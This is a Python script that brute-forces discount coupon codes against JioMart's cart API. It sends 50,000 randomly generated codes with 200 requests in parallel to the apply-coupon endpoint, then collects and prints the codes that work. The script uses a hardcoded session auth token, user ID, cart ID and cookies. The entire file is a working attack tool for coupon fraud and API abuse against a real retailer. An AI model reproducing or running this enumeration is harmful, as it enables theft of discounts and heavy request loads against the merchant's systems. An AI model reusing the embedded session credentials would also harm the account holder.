import asyncio
import aiohttp
import random
import string

apply_url = "https://www.jiomart.com/mst/rest/v1/5/cart/apply_coupon"
unapply_url = "https://www.jiomart.com/mst/rest/v1/5/cart/unapply_coupon?coupon_code=####&cart_id=648598357"
get_current_coupon_url = "https://www.jiomart.com/mst/rest/v1/5/cart/get"

headers = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "authtoken": "b3720c54d956bdc5f87dc8570166689125c4d178-91131361",
    "pin": "560068",
    "priority": "u=1, i",
    "referer": "https://www.jiomart.com/checkout/cart",
    "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "userid": "81712781"
}
cookies = {
    "_ALGOLIA": "anonymous-d2a88e42-070e-4e6d-8a8d-c6b3d7490e5e",
    "new_customer": "false",
    "ajs_anonymous_id": "2f0b9a55-8526-4e6d-ade1-89891a30ea79",
    "nms_mgo_pincode": "560068",
    "nms_mgo_city": "Bangalore",
    "nms_mgo_state_code": "KA"
}


# 🔹 Generate coupon code
def generate_random_code():
    digits = '123456789'
    letters = string.ascii_uppercase
    result = ''
    for i in range(10):
        if i % 2 == 0:
            result += random.choice(digits)
        else:
            result += random.choice(letters)
    return result


async def calling_rest_generic(session, params, url):
    try:
        async with session.get(url, headers=headers, cookies=cookies, params=params) as resp:
            return await resp.json()
    except Exception as e:
        print("Error:", e)
        return None


# 🔹 Async worker returns result instead of touching globals
async def calling_rest(session, code):
    params = {"coupon_code": code, "cart_id": "648598357"}
    data = await calling_rest_generic(session, params, apply_url)
    print(data)
    if data and data.get("reason") and data["reason"].get("reason_code") != "MAX_LIMIT_BREACH":
        return {"status": "failed", "code": None, "response": data}
    else:
        data_valid = await calling_rest_generic(session, params, get_current_coupon_url)
        valid_code = None
        if data_valid and "result" in data_valid:
            valid_code = data_valid["result"]["cart"]["applied_coupons"]
            await calling_rest_generic(session, params, unapply_url.replace("####", valid_code))
        return {"status": "success", "code": valid_code, "response": data}


# 🔹 Main async runner
async def main():
    total_requests = 50000   # how many codes to test
    concurrency = 200       # max parallel

    connector = aiohttp.TCPConnector(limit=concurrency)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [calling_rest(session, generate_random_code()) for _ in range(total_requests)]
        results = await asyncio.gather(*tasks)

    # aggregate results
    failed = sum(1 for r in results if r["status"] == "failed")
    success = [r["code"] for r in results if r["status"] == "success" and r["code"]]

    print(f"Failed: {failed}, Success: {len(success)}")
    print("Valid Codes:", success)


if __name__ == "__main__":
    asyncio.run(main())

